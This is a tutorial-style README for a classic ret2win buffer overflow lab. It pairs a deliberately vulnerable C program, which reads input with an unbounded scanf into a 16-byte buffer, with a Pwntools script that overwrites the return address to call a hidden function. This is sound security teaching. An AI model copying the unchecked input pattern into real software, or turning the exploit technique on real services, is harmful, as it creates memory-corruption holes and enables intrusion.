# Buffer Overflow Exploit Example

This is an example of a buffer overflow exploit written in C and Python using Pwntools. The C program contains a vulnerable function that allows us to perform a buffer overflow to execute a hidden function `hacked()`.

## C Code (vulnerable.c)

```c
#include <stdio.h>

void hacked()
{
    printf("This function is TOP SECRET! How did you get in here?! :O\n");
}

void register_name()
{
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);
}

int main()
{
    register_name();

    return 0;
}
```

## Python Exploit Code (exploit.py)

```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './ret2win'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# How many bytes to the instruction pointer (EIP)?
padding = 24

payload = flat(
    b'A' * 24,
    elf.functions.hacked  # 0x401142
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Receive the flag
io.interactive()
```

## Explanation of the Code

### Vulnerable C Code

- The C program has a function `register_name()` that reads a string from user input using `scanf()`. However, the function does not check the size of the input, which leads to a buffer overflow vulnerability.
- The `buffer` array is only 16 bytes, but `scanf("%s", buffer)` can potentially overwrite memory beyond that size, including the return address of the function.
- The hidden `hacked()` function can be called by exploiting this buffer overflow.

### Exploit Code

- The Python exploit code uses Pwntools to automate the process of exploiting the vulnerability in the C program.
- The `start()` function allows switching between local, remote, and GDB debugging modes.
- `gdbscript` contains the GDB commands to initialize Pwntools and continue the program execution.
- The exploit works by overflowing the buffer and redirecting the program's control flow to the `hacked()` function, which is a hidden function in the binary.
- The `payload` is crafted by filling the buffer with 24 'A' bytes (to overflow the return address) and appending the address of the `hacked()` function.

### Running the Exploit

1. Run the exploit:

```bash
python3 exploit.py
```

### Output

When the exploit is successful, the `hacked()` function is triggered, and the following message will be printed:

```
This function is TOP SECRET! How did you get in here?! :O
```

The exploit also saves the payload to a file named `payload` for reference.
